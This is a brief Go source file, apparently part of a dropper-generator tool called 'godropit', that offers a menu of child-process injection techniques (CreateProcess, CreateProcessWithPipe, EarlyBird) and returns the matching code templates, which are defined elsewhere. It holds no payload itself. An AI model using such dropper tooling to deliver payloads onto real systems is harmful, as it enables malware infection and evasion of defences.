package child

import (
	"godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateProcess", "CreateProcessWithPipe", "EarlyBird"}

func SelectChild() (Dlls, Inject, Import string) {

	_, selected, _ := dropfmt.PromptList(Droppers, "Select the child dropper you would like to use:")

	switch selected {
	case "CreateProcess":
		Dlls = CreateProcessDlls
		Inject = CreateProcess
		Import = CreateProcessImports
	case "CreateProcessWithPipe":
		Dlls = CreateProcWithPipeDlls
		Inject = CreateProcWithPipe
		Import = CreateProcWithPipeImports
	case "EarlyBird":
		Dlls = EarlyBirdDlls
		Inject = EarlyBird
		Import = EarlyBirdImports
	}

	return Dlls, Inject, Import
}
